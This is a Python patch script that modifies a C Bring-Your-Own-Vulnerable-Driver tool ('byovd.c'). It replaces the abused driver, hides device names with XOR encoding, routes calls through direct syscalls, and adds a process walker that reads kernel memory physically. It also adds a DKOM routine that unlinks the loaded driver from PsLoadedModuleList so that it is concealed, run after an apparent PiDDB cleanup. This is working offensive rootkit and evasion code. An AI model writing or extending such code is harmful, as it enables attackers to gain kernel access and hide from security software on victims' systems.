import re

with open('byovd.c', 'rb') as f:
    data = f.read()
text = data.decode('utf-8', errors='replace')

# ── 1. Pk_AsrDrvTS -> Pk_CtiDrvTS ────────────────────────────────────────
text = text.replace('static ULONG Pk_AsrDrvTS(void){', 'static ULONG Pk_CtiDrvTS(void){')
text = text.replace('ULONG ts=Pk_AsrDrvTS();', 'ULONG ts=Pk_CtiDrvTS();')

# ── 2. Remove the stale syscall pointer pattern (InitSyscallPointers)     ──
# The old code had function pointer indirection; now syscalls come from .asm
# We keep the code but the pSysNtLoadDriver pointers are still used in
# DropAndLoad via the (tNtLD)SysNtLoadDriver cast — that's fine.

# ── 3. TryOpenViaNtPath: replace body with SysNtOpenFile + NT path CtiIo ──
old_try = '''static HANDLE TryOpenViaNtPath(void) {
    typedef VOID   (NTAPI *pfnRtlIUS)(BYOVD_US*, PCWSTR);
    typedef NTSTATUS(NTAPI *pfnNtOF)(PHANDLE, DWORD, PVOID, PVOID, ULONG, ULONG);
    HMODULE hNt = GetModuleHandleW(L"ntdll.dll");
    pfnRtlIUS  RtlIUS = (pfnRtlIUS) GetProcAddress(hNt, "RtlInitUnicodeString");
    pfnNtOF    NtOF   = (pfnNtOF)   GetProcAddress(hNt, "NtOpenFile");
    if (!RtlIUS || !NtOF) return INVALID_HANDLE_VALUE;
    BYOVD_US us = {0};
    RtlIUS(&us, L"\\\\Device\\\\AsrDrv103");
    struct { ULONG Len; HANDLE Root; BYOVD_US* Name; ULONG Attr; PVOID SD; PVOID SQoS; }
        oa = { sizeof(oa), NULL, &us, 0x40 /*OBJ_CASE_INSENSITIVE*/, NULL, NULL };
    struct { NTSTATUS Status; ULONG_PTR Info; } iosb = {0};
    HANDLE h = NULL;
    NTSTATUS ns = NtOF(&h, GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE, &oa, &iosb,
                        FILE_SHARE_READ|FILE_SHARE_WRITE, 0x20 /*FILE_SYNCHRONOUS_IO_NONALERT*/);
    BYOVD_LogFmt("TryOpenViaNtPath: NtOpenFile ns=0x%08X h=%p", ns, h);
    if (ns < 0 || !h || h == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;
    return h;
}'''

new_try = r'''static HANDLE TryOpenViaNtPath(void) {
    /* \\Device\\CtiIo -- XOR-encoded (key=0x31) to avoid plaintext in .rdata */
    static const UCHAR enc[] = {0x6D,0x75,0x54,0x47,0x58,0x52,0x54,0x6D,0x72,0x45,0x58,0x78,0x5E};
    WCHAR ntPath[14]; int i;
    for(i=0;i<13;i++) ntPath[i]=(WCHAR)(enc[i]^0x31); ntPath[13]=0;
    BYOVD_US us = { (USHORT)(13*2), (USHORT)(14*2), ntPath };
    struct { ULONG Len; HANDLE Root; BYOVD_US* Name; ULONG Attr; PVOID SD; PVOID SQoS; }
        oa = { sizeof(oa), NULL, &us, 0x40, NULL, NULL };
    BYOVD_IOSB iosb = {0};
    HANDLE h = NULL;
    NTSTATUS ns = SysNtOpenFile(&h,
        GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE,
        (POBJECT_ATTRIBUTES)&oa, (PIO_STATUS_BLOCK)&iosb,
        FILE_SHARE_READ|FILE_SHARE_WRITE, 0x20);
    BYOVD_LogFmt("TryOpenViaNtPath(CtiIo): ns=0x%08X h=%p", ns, h);
    if (ns < 0 || !h || h == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;
    return h;
}'''

if old_try in text:
    text = text.replace(old_try, new_try)
    print('1x replaced: TryOpenViaNtPath')
else:
    print('WARNING: TryOpenViaNtPath old body not found')

# ── 4. BYOVD_Init XOR key: update for \\.\\CtiIo ─────────────────────────
# Old: static const unsigned char s_enc[] = {0x4F,0x34,...}; (12 chars AsrDrv103)
# New: \\.\\CtiIo XOR (key=0x13+i*7), 9 chars + null = 10 bytes
old_xor = 'static const unsigned char s_enc[] = {0x4F,0x34,0x7D,0x69,0x5C,0x44,0x79,0x36,0x3D,0x63,0x69,0x53};'
old_loop = 'wchar_t dev[16]; for(int i=0;i<12;i++) dev[i]=(wchar_t)(s_enc[i]^(0x13+i*7)); dev[12]=0;'

new_xor = ('/* \\\\.\\\\CtiIo XOR-encoded (key=0x13+i*7), 9 chars + null terminator */')
new_xor += '\n    static const unsigned char s_enc[] = {0x4F,0x46,0x0F,0x74,0x6C,0x42,0x54,0x0D,0x24,0x52};'
new_loop = 'wchar_t dev[16]; for(int i=0;i<10;i++) dev[i]=(wchar_t)(s_enc[i]^(0x13+i*7)); dev[10]=0;'

if old_xor in text:
    text = text.replace(old_xor, new_xor)
    print('1x replaced: XOR s_enc array')
else:
    print('WARNING: XOR s_enc not found')

if old_loop in text:
    text = text.replace(old_loop, new_loop)
    print('1x replaced: XOR decode loop')
else:
    print('WARNING: XOR decode loop not found')

# ── 5. UnloadDriver: replace GetProcAddress NtUnloadDriver + CloseHandle  ──
old_unload = '''static void UnloadDriver(void){
    if(s_hDev!=INVALID_HANDLE_VALUE){ CloseHandle(s_hDev); s_hDev=INVALID_HANDLE_VALUE; }
    if(!s_svcName[0]) return;
    tNtUD NtUD=(tNtUD)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtUnloadDriver");
    tRtlIUS RtlIUS=(tRtlIUS)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"RtlInitUnicodeString");
    if(NtUD&&RtlIUS){
        WCHAR ntSvc[256]; wsprintfW(ntSvc,L"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\\\\%s",s_svcName);
        BYOVD_US us; RtlIUS(&us,ntSvc);
        NtUD(&us);
    }'''

new_unload = '''static void UnloadDriver(void){
    if(s_hDev!=INVALID_HANDLE_VALUE){ SysNtClose(s_hDev); s_hDev=INVALID_HANDLE_VALUE; }
    if(!s_svcName[0]) return;
    tRtlIUS RtlIUS=(tRtlIUS)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"RtlInitUnicodeString");
    if(RtlIUS){
        WCHAR ntSvc[256]; wsprintfW(ntSvc,L"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\\\\%s",s_svcName);
        BYOVD_US us; RtlIUS(&us,ntSvc);
        SysNtUnloadDriver(&us);
    }'''

if old_unload in text:
    text = text.replace(old_unload, new_unload)
    print('1x replaced: UnloadDriver')
else:
    print('WARNING: UnloadDriver body not found')

# ── 6. Add BYOVD_FindProcessInfo after BYOVD_FindProcessCR3 ─────────────
find_info_func = r'''
/* Walk ActiveProcessLinks to find process by name, returning CR3 AND PEB virtual address.
 * EP_PEB = 0x550 on Win10 22H2 x64 (confirmed in driver.c).
 * Same loop as BYOVD_FindProcessCR3, just reads one extra field. */
BOOL BYOVD_FindProcessInfo(const char *imageName, UINT64 *outCR3, UINT64 *outPebVA){
    if(!imageName||!outCR3||!outPebVA) return FALSE;
    if(!s_sysEprocPA) s_sysEprocPA=FindSystemEproc();
    if(!s_sysEprocPA||!s_sysCR3) return FALSE;
    UINT64 flink=PhysReadU64(s_sysEprocPA+EP_ACTIVELINKS);
    UINT64 cur=flink; int guard=0;
    while(cur && guard++<512){
        UINT64 eproc_va=cur-EP_ACTIVELINKS;
        UINT64 eproc_pa=VA2PA(s_sysCR3,eproc_va);
        if(!eproc_pa) break;
        char name[16]={0}; PhysRead(eproc_pa+EP_IMAGENAME,name,15);
        if(_stricmp(name,imageName)==0){
            UINT64 cr3=PhysReadU64(eproc_pa+EP_DIRTABLEBASE);
            UINT64 peb=PhysReadU64(eproc_pa+0x550); /* EP_PEB Win10 22H2 */
            if((cr3&0xFFF)==0 && cr3>0){
                *outCR3=cr3; *outPebVA=peb;
                return TRUE;
            }
        }
        UINT64 next=PhysReadU64(eproc_pa+EP_ACTIVELINKS);
        if(next==flink||next==cur) break;
        cur=next;
    }
    return FALSE;
}
'''

# Insert after the closing brace of BYOVD_FindProcessCR3
anchor = 'UINT64 BYOVD_GetModuleBase'
if anchor in text:
    text = text.replace(anchor, find_info_func + 'UINT64 BYOVD_GetModuleBase', 1)
    print('1x inserted: BYOVD_FindProcessInfo')
else:
    print('WARNING: BYOVD_GetModuleBase anchor not found')

# ── 7. Add Pk_FindExport + HideByovdDriver before DropAndLoad ───────────
hide_driver_func = r'''
/* ── PsLoadedModuleList export resolver ─────────────────────────────────── */
static BOOL Pk_FindExport(const BYTE *img, DWORD imgSz, const char *symName, DWORD *outRVA){
    if(!img||imgSz<0x200) return FALSE;
    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)img;
    if(dos->e_magic!=IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS64 nt=(PIMAGE_NT_HEADERS64)(img+dos->e_lfanew);
    if(nt->Signature!=IMAGE_NT_SIGNATURE) return FALSE;
    DWORD expRVA=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if(!expRVA||expRVA+sizeof(IMAGE_EXPORT_DIRECTORY)>imgSz) return FALSE;
    PIMAGE_EXPORT_DIRECTORY exp=(PIMAGE_EXPORT_DIRECTORY)(img+expRVA);
    DWORD *names=(DWORD*)(img+exp->AddressOfNames);
    DWORD *funcs=(DWORD*)(img+exp->AddressOfFunctions);
    WORD  *ords =(WORD* )(img+exp->AddressOfNameOrdinals);
    for(DWORD i=0;i<exp->NumberOfNames;i++){
        if(names[i]>=imgSz) continue;
        if(_stricmp((char*)(img+names[i]),symName)==0){
            *outRVA=funcs[ords[i]]; return TRUE;
        }
    }
    return FALSE;
}

/* DKOM: unlink CtiIo64 from PsLoadedModuleList via Ring-3 physical writes.
 * Primary: export table lookup (PsLoadedModuleList IS exported by ntoskrnl).
 * Fallback: two pattern scans for robustness.
 * Write order: Blink->Flink = Flink, then Flink->Blink = Blink, then self-point.
 * BYOVD_WriteVA does R-M-W on 4KB page => 8-byte aligned writes are atomic. */
static void HideByovdDriver(void){
    if(!s_sysCR3) return;
    UINT64 kBase=Pk_ModBase("ntoskrnl.exe"); if(!kBase) return;
    WCHAR path[MAX_PATH]; GetSystemDirectoryW(path,MAX_PATH);
    wcscat_s(path,MAX_PATH,L"\\ntoskrnl.exe");
    DWORD imgSz=0; BYTE *img=Pk_MapPE(path,&imgSz); if(!img) return;

    UINT64 listHeadKA=0;
    /* Method 1: resolve via export table */
    DWORD listRVA=0;
    if(Pk_FindExport(img,imgSz,"PsLoadedModuleList",&listRVA)&&listRVA)
        listHeadKA=kBase+listRVA;
    /* Method 2: pattern scan fallback A */
    if(!listHeadKA){
        static const BYTE P1[]={0x48,0x8B,0x1D,0,0,0,0,0x48,0x85,0xDB};
        static const char M1[]="xxx????xxx";
        ULONG r=Pk_Scan(img,imgSz,P1,M1,sizeof(P1));
        if(r){ LONG d=*(LONG*)(img+r+3); listHeadKA=kBase+r+7+(LONGLONG)d; }
    }
    /* Method 3: pattern scan fallback B */
    if(!listHeadKA){
        static const BYTE P2[]={0x4C,0x8D,0x25,0,0,0,0,0xEB};
        static const char M2[]="xxx????x";
        ULONG r=Pk_Scan(img,imgSz,P2,M2,sizeof(P2));
        if(r){ LONG d=*(LONG*)(img+r+3); listHeadKA=kBase+r+7+(LONGLONG)d; }
    }
    VirtualFree(img,0,MEM_RELEASE);
    if(!listHeadKA){ BYOVD_Log("HideByovdDriver: PsLoadedModuleList not found"); return; }

    /* Walk list physically
     * LDR_DATA_TABLE_ENTRY layout (Win10 22H2 x64):
     *   +0x00 InLoadOrderLinks.Flink  (UINT64)
     *   +0x08 InLoadOrderLinks.Blink  (UINT64)
     *   +0x48 BaseDllName             (UNICODE_STRING 0x10b)
     *   +0x58 FullDllName             (UNICODE_STRING 0x10b) */
    UINT64 cur=0;
    BYOVD_ReadVA(s_sysCR3,listHeadKA,&cur,8);
    for(int g=0;cur&&cur!=listHeadKA&&g<512;g++){
        UINT64 entry=cur;
        USHORT nLen=0; UINT64 nBuf=0;
        BYOVD_ReadVA(s_sysCR3,entry+0x48,&nLen,2);
        BYOVD_ReadVA(s_sysCR3,entry+0x50,&nBuf,8);
        if(nBuf&&nLen>0&&nLen<=64){
            WCHAR nm[36]={0};
            BYOVD_ReadVA(s_sysCR3,nBuf,nm,(ULONG)(nLen<70?nLen:70));
            if(_wcsnicmp(nm,L"CtiIo",5)==0){
                UINT64 flink=0,blink=0;
                BYOVD_ReadVA(s_sysCR3,entry+0x00,&flink,8);
                BYOVD_ReadVA(s_sysCR3,entry+0x08,&blink,8);
                BYOVD_WriteVA(s_sysCR3,blink,    &flink,8); /* prev->Flink=next */
                BYOVD_WriteVA(s_sysCR3,flink+0x08,&blink,8); /* next->Blink=prev */
                BYOVD_WriteVA(s_sysCR3,entry+0x00,&entry,8); /* self-flink */
                BYOVD_WriteVA(s_sysCR3,entry+0x08,&entry,8); /* self-blink */
                UINT64 z64=0; USHORT z16=0;
                BYOVD_WriteVA(s_sysCR3,entry+0x48,&z16,2);
                BYOVD_WriteVA(s_sysCR3,entry+0x4A,&z16,2);
                BYOVD_WriteVA(s_sysCR3,entry+0x50,&z64,8);
                BYOVD_WriteVA(s_sysCR3,entry+0x58,&z16,2);
                BYOVD_WriteVA(s_sysCR3,entry+0x5A,&z16,2);
                BYOVD_WriteVA(s_sysCR3,entry+0x60,&z64,8);
                BYOVD_Log("HideByovdDriver: CtiIo64 unlinked from PsLoadedModuleList");
                return;
            }
        }
        BYOVD_ReadVA(s_sysCR3,cur,&cur,8);
    }
    BYOVD_Log("HideByovdDriver: CtiIo64 entry not found in list");
}
'''

# Insert before DropAndLoad
anchor2 = 'static BOOL DropAndLoad(void){'
if anchor2 in text:
    text = text.replace(anchor2, hide_driver_func + anchor2, 1)
    print('1x inserted: Pk_FindExport + HideByovdDriver')
else:
    print('WARNING: DropAndLoad anchor not found')

# ── 8. BYOVD_Init: add HideByovdDriver call after CleanPiDDB ─────────────
text = text.replace('    CleanPiDDB();\n    return TRUE;',
                    '    CleanPiDDB();\n    HideByovdDriver();\n    return TRUE;')
print('Added HideByovdDriver call in BYOVD_Init (check manually if 0x find)')

# ── 9. Verify no more ASRDRV references ─────────────────────────────────
remaining = text.count('ASRDRV') + text.count('AsrDrv') + text.count('AsrPhys')
print(f'Remaining ASR references: {remaining}')

with open('byovd.c', 'w', encoding='utf-8') as f:
    f.write(text)
print('DONE')
